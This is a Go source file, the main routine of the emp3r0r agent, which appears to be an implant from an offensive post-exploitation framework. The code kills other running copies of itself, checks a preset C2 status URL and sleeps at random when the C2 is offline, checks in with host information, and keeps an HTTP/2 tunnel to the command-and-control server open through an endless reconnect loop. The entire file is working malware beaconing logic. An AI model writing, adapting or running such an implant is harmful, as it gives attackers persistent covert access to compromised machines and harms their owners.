package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
)

func main() {
	fmt.Println("emp3r0r agent started")
	log.SetOutput(os.Stderr)

	// kill any running agents
	alive, procs := agent.IsProcAlive("emp3r0r")
	if alive {
		for _, proc := range procs {
			if proc.Pid == os.Getpid() {
				continue
			}
			err := proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}

connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if !agent.IsCCOnline() {
		log.Println("CC not online")
		time.Sleep(time.Duration(agent.RandInt(1, 120)) * time.Minute)
	}

	// check in with system info
	err := agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
	}
	log.Println("Checked in")

	// connect to TunAPI, the JSON based h2 tunnel
	tunURL := agent.CCAddress + tun.TunAPI
	conn, ctx, cancel, err := agent.ConnectCC(tunURL)
	agent.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	err = agent.CCTun(ctx, cancel)
	if err != nil {
		log.Printf("CCTun: %v, reconnecting...", err)
	}
	goto connect
}
